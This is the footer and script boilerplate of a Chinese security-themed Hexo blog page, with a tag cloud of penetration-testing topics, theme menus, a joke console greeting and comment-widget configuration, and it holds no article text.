style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>